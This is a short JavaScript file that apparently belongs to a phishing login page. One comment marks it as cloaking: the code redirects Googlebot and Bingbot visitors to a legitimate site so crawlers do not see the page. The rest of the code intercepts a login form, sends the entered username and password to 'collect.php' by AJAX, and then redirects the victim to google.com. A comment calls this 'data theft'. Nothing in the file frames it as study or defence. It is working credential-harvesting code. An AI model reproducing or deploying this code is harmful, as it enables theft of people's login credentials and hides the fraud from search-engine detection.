// Basic cloaking: Redirect bots to legitimate site
if (navigator.userAgent.includes("Googlebot") || navigator.userAgent.includes("Bingbot")) {
    window.location.href = "https://example.com";
}

function validateForm() {
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;
    
    if (username === "" || password === "") {
        alert("Please fill in all fields.");
        return false;
    }
    
    // AJAX submission to avoid page reload
    $.ajax({
        url: "collect.php",
        type: "POST",
        data: { username: username, password: password },
        success: function(response) {
            // Redirect to legitimate site after data theft
            window.location.href = "https://google.com";
        },
        error: function() {
            alert("An error occurred. Please try again.");
        }
    });
    return false; // Prevent default form submission
}

// Attach event listener to form
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();
    validateForm();
});
